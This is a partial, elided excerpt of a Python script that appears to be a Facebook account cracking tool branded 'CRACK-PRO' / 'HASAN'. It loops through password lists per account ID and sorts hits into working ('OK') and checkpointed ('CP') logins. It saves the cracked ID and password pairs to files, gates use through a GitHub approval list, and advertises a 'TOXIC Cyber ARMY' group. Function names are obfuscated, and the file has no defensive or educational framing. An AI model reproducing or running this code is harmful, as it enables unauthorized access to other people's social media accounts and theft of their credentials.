...
try:
    rq = requests.get('https://github.com/KgHasan/CRACK-PRO/blob/main/Approved.txt').text
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sHASAN❌-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        else:print("\r %s[%sHASAN✓-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                        self.ada.append("%s•%s"%(fl.get("id"),i));_azimvau_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
                else:continue
            self.ko+=1
            print("\r %s[%sCRACK%s][%s%s/%s%s][%sHASAN✓-OK:%s%s][%sHASAN❌-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            ...
            try:
                ...
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sHASAN✓-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("sHASAN❌-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("sHASAN❌-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sHASAN❌-CP%s] %s'%(K,P,K,yyy))
...
def started():
    ...
    print('%s [%s•%s] %s[%sNiL✓-OK%s] IDS SAVED IN >> %sNiL✓-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sNiL❌-CP%s] IDS SAVED IN >> %sNIL❌-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
...
def genkey():
	try:
		...
		print("\033[0;94m          Facebook ID : Nx Nil Chowdhury ")
		print("\033[0;94m          Facebook Group : TOXIC Cyber ARMY \n\n")
		subprocess.check_output(["am", "start", "https://wa.me/+8801914436101"])
		exit()
	except(IOError):
		rb = rx
